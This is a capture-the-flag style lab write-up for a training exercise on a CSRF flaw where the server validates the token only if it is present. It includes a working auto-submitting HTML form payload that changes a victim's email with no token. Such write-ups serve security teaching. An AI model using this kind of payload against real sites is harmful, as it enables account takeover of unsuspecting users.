# CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Detection

- Clicked `ACCESS THE LAB` and was presented with the blog page. Clicked `My Account` and logged in with `wiener:peter`, landing on `/my-account?id=wiener`.
- Inspecting the email change form in the page source revealed a CSRF token present as a hidden field:

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm">
    <button class="button" type="submit"> Update email </button>
</form>
```

- Changed the email and captured the resulting `POST /my-account/change-email` request in BurpSuite. The request body included both the `email` and the `csrf` parameter.

---

## 2. Probing the CSRF Token Validation

- Tried removing the `csrf` parameter from the request body entirely and sending the request as-is with just `email=xyz%40test.com`.
- The server accepted the request without complaint and returned a `302 Found` redirect — **no error, no rejection**.
- This confirmed the flaw: the server only validates the CSRF token if it is present in the request. If the parameter is omitted entirely, the validation logic is skipped altogether.

> **Why this works:** The server-side check likely looks something like:
>
> ```php
> if (isset($_POST['csrf'])) {
>     // validate the token
> }
> ```
>
> A correct implementation would treat a missing CSRF token the same as an invalid one — rejecting the request in both cases. Instead, the absence of the parameter causes the check to be bypassed completely, meaning any cross-origin POST without a `csrf` field will be processed as if it were legitimate.

---

## 3. Solve the Challenge

- Crafted a CSRF payload using `POST` (same method as the original request), targeting the change-email endpoint on the lab domain, with no `csrf` field included at all:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a4f00480353b2d5804135cc00cd006c.web-security-academy.net/my-account/change-email" method="POST">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="test2@test.com" name="email"></td>
         </tr>
      </table>
   </form>
   <script>
        document.forms[0].submit();
   </script>
</html>
```

- Hosted this on the exploit server and delivered it to the victim.
- The victim's browser auto-submitted the `POST` request on page load. Since no `csrf` parameter was present, the server skipped token validation entirely, accepted the request, and changed the victim's email.
- Lab solved.